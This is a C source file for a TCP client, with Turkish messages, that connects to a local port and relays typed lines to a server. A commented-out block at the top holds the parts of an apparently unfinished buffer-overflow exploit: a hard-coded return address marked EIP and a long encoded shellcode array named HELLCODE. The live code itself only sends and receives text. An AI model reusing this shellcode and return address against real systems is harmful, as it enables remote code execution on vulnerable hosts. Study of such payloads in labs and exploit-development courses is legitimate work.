#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
/*
#define uname "A"
#define EIP "\xEB\x30\x9C\x7C"
#define HELLCODE ( \
"\xda\xc9\xd9\x74\x24\xf4\xb8\xa3\xf4\x46\xc5\x5a\x2b" \
"\xc9\xb1\x53\x83\xea\xfc\x31\x42\x13\x03\xe1\xe7\xa4" \
"\x30\x19\xef\xab\xbb\xe1\xf0\xcb\x32\x04\xc1\xcb\x21" \
"\x4d\x72\xfc\x22\x03\x7f\x77\x66\xb7\xf4\xf5\xaf\xb8" \
"\xbd\xb0\x89\xf7\x3e\xe8\xea\x96\xbc\xf3\x3e\x78\xfc" \
"\x3b\x33\x79\x39\x21\xbe\x2b\x92\x2d\x6d\xdb\x97\x78" \
"\xae\x50\xeb\x6d\xb6\x85\xbc\x8c\x97\x18\xb6\xd6\x37" \
"\x9b\x1b\x63\x7e\x83\x78\x4e\xc8\x38\x4a\x24\xcb\xe8" \
"\x82\xc5\x60\xd5\x2a\x34\x78\x12\x8c\xa7\x0f\x6a\xee" \
"\x5a\x08\xa9\x8c\x80\x9d\x29\x36\x42\x05\x95\xc6\x87" \
"\xd0\x5e\xc4\x6c\x96\x38\xc9\x73\x7b\x33\xf5\xf8\x7a" \
"\x93\x7f\xba\x58\x37\xdb\x18\xc0\x6e\x81\xcf\xfd\x70" \
"\x6a\xaf\x5b\xfb\x87\xa4\xd1\xa6\xcf\x09\xd8\x58\x10" \
"\x06\x6b\x2b\x22\x89\xc7\xa3\x0e\x42\xce\x34\x70\x79" \
"\xb6\xaa\x8f\x82\xc7\xe3\x4b\xd6\x97\x9b\x7a\x57\x7c" \
"\x5b\x82\x82\xe9\x53\x25\x7d\x0c\x9e\x95\x2d\x90\x30" \
"\x7e\x24\x1f\x6f\x9e\x47\xf5\x18\x37\xba\xf6\x37\x94" \
"\x33\x10\x5d\x34\x12\x8a\xc9\xf6\x41\x03\x6e\x08\xa0" \
"\x3b\x18\x41\xa2\xfc\x27\x52\xe0\xaa\xbf\xd9\xe7\x6e" \
"\xde\xdd\x2d\xc7\xb7\x4a\xbb\x86\xfa\xeb\xbc\x82\x6c" \
"\x8f\x2f\x49\x6c\xc6\x53\xc6\x3b\x8f\xa2\x1f\xa9\x3d" \
"\x9c\x89\xcf\xbf\x78\xf1\x4b\x64\xb9\xfc\x52\xe9\x85" \
"\xda\x44\x37\x05\x67\x30\xe7\x50\x31\xee\x41\x0b\xf3" \
"\x58\x18\xe0\x5d\x0c\xdd\xca\x5d\x4a\xe2\x06\x28\xb2" \
"\x53\xff\x6d\xcd\x5c\x97\x79\xb6\x80\x07\x85\x6d\x01" \
"\x37\xcc\x2f\x20\xd0\x89\xba\x70\xbd\x29\x11\xb6\xb8" \
"\xa9\x93\x47\x3f\xb1\xd6\x42\x7b\x75\x0b\x3f\x14\x10" \
"\x2b\xec\x15\x31")*/

int main(void){
int sockname = 0;
char gelen[1024];
char mesaj[1024];

struct sockaddr_in serv_adres;
memset(gelen, '\x00', sizeof(gelen));
if((sockname = socket(AF_INET, SOCK_STREAM, 0))< 0){
printf("Socket acilamadi");
return 1;
}
serv_adres.sin_family = AF_INET;
serv_adres.sin_port = htons(8080);
serv_adres.sin_addr.s_addr = inet_addr("127.0.0.1");
if(connect(sockname, (struct sockaddr *)&serv_adres, sizeof(serv_adres))<0){
printf("baglanti kurulamadi");
}
void dinle(){
for(;;){
int b = read(sockname, gelen, sizeof(gelen));
void eal(){fputs(gelen, stdout);bzero(gelen, 1024);};eal(); break;}
}
int ret;
memset(mesaj, 0, sizeof(mesaj));
while(fgets(mesaj, 1024, stdin)) {
ret = send(sockname, mesaj, strlen(mesaj), 0);bzero(mesaj, 1024);
if (ret < 0) {  
printf("veri gonderilemedi: \n\t-%s", mesaj);}
dinle();
}
}
